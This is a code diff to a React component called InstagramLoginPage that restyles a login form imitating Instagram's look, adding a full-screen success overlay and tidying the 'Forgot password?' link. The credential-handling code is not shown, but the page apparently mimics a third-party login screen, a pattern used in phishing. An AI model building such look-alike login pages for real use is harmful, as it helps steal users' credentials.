@@ -43,20 +43,114 @@ export default function InstagramLoginPage() {
       </Head>
 
       <style jsx>{`
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fafafa; height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; }
-        .login-container { background: white; width: 360px; padding: 40px 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); text-align: center; }
-        .logo { width: 96px; height: 96px; margin: 0 auto 24px; }
-        input { width: 100%; padding: 14px 16px; margin: 12px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 15px; }
-        input:focus { outline: none; border-color: #e1306c; }
-        button { width: 100%; padding: 14px; background: #e1306c; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; margin-top: 8px; }
-        button:hover { background: #c9305a; }
-        .feedback { color: #e1306c; font-size: 14px; margin: 8px 0; }
-        .success-overlay { position: fixed; inset: 0; background: rgba(255,255,255,0.98); display: none; align-items: center; justify-content: center; z-index: 9999; }
-        .success-overlay.show { display: flex; }
-        .success-box { text-align: center; padding: 20px; }
-        .checkmark { width: 110px; height: 110px; background: #4caf50; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 28px; box-shadow: 0 4px 12px rgba(76,175,80,0.4); }
-        .checkmark svg { width: 56px; height: 56px; }
-        @media (max-width: 480px) { .login-container { width: 90%; padding: 24px 20px; } }
+        html, body { height: 100%; margin: 0; padding: 0; }
+        body { 
+          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+          background: #fafafa; 
+          display: flex; 
+          align-items: center; 
+          justify-content: center; 
+          min-height: 100vh;
+        }
+        .login-container {
+          background: white; 
+          width: 360px; 
+          padding: 40px 30px; 
+          border-radius: 12px; 
+          box-shadow: 0 4px 20px rgba(0,0,0,0.15); 
+          text-align: center;
+          max-width: 90vw;
+        }
+        .logo { 
+          width: 96px; 
+          height: 96px; 
+          margin: 0 auto 24px; 
+          display: block;
+        }
+        input { 
+          width: 100%; 
+          max-width: 320px;
+          padding: 14px 16px; 
+          margin: 12px auto 0;
+          display: block;
+          border: 1px solid #ddd; 
+          border-radius: 6px; 
+          font-size: 15px; 
+          background: #fafafa;
+        }
+        input:focus { 
+          outline: none; 
+          border-color: #e1306c; 
+          background: white;
+        }
+        button { 
+          width: 100%; 
+          max-width: 320px;
+          padding: 14px; 
+          background: #e1306c; 
+          color: white; 
+          border: none; 
+          border-radius: 6px; 
+          font-size: 16px; 
+          cursor: pointer;
+          margin-top: 8px;
+          display: block;
+        }
+        button:hover { 
+          background: #c9305a; 
+        }
+        .feedback { 
+          color: #e1306c; 
+          font-size: 14px; 
+          margin: 8px auto 0;
+          max-width: 320px;
+          display: block;
+        }
+        a {
+          color: #007bff;
+          text-decoration: none;
+          font-size: 14px;
+          display: block;
+          margin-top: 16px;
+        }
+        .success-overlay { 
+          position: fixed; 
+          inset: 0; 
+          background: rgba(255,255,255,0.98); 
+          display: none; 
+          align-items: center; 
+          justify-content: center; 
+          z-index: 9999; 
+        }
+        .success-overlay.show { 
+          display: flex; 
+        }
+        .success-box { 
+          text-align: center; 
+          padding: 20px; 
+        }
+        .checkmark { 
+          width: 110px; 
+          height: 110px; 
+          background: #4caf50; 
+          border-radius: 50%; 
+          display: flex; 
+          align-items: center; 
+          justify-content: center; 
+          margin: 0 auto 28px; 
+          box-shadow: 0 4px 12px rgba(76,175,80,0.4); 
+        }
+        .checkmark svg { 
+          width: 56px; 
+          height: 56px; 
+        }
+        @media (max-width: 480px) { 
+          .login-container { 
+            width: 90vw; 
+            padding: 24px 20px; 
+          }
+          input, button { max-width: none; }
+        }
       `}</style>
 
       <div className="login-container">
@@ -81,7 +175,7 @@ export default function InstagramLoginPage() {
         
         <button onClick={handleLogin}>Log In</button>
         
-        <a href="#" style={{display: 'block', marginTop: '16px', color: '#007bff', fontSize: '14px'}}>Forgot password?</a>
+        <a href="#">Forgot password?</a>
       </div>
 
       <div className="success-overlay" id="successOverlay">
